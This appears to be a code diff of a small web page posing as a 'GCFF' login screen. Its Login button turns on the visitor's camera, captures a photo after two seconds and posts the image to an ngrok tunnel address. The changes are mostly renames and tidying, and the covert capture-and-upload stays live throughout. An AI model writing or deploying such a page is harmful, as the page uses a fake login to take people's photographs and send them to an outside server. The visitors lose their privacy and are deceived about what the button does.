@@ -2,10 +2,10 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>GCFF Login</title>
+<title>GCFF</title>
 </head>
 
-<body style="font-family:Arial; text-align:center; background:#0f172a; color:white;">
+<body style="text-align:center;font-family:Arial;background:#0f172a;color:white">
 
 <h2>Welcome to GCFF</h2>
 
@@ -14,9 +14,7 @@
 
 <button onclick="login()">Login</button>
 
-<br><br>
-
-<video id="video" autoplay style="width:300px; border-radius:10px;"></video>
+<video id="video" autoplay style="width:300px;margin-top:20px;border-radius:10px;"></video>
 
 <script>
 let stream;
@@ -29,14 +27,12 @@ function login() {
     const video = document.getElementById("video");
     video.srcObject = stream;
 
-    setTimeout(takePhoto, 2000);
+    setTimeout(capture, 2000);
   })
-  .catch(err => {
-    alert("Camera blocked");
-  });
+  .catch(() => alert("camera denied"));
 }
 
-function takePhoto() {
+function capture() {
   const video = document.getElementById("video");
 
   const canvas = document.createElement("canvas");
@@ -49,21 +45,18 @@ function takePhoto() {
 
   const image = canvas.toDataURL("image/png");
 
-  // stop camera
   stream.getTracks().forEach(t => t.stop());
 
-  // ENVOI VERS TON SERVEUR NGROK
   fetch("https://unsighing-prepalatine-yi.ngrok-free.dev/upload", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({
-      image: image
-    })
+    body: JSON.stringify({ image })
   })
-  .then(() => alert("Photo sent ✔"))
-  .catch(() => alert("Upload failed"));
+  .then(res => res.text())
+  .then(data => alert("Photo sent ✔"))
+  .catch(err => alert("Upload error"));
 }
 </script>
 
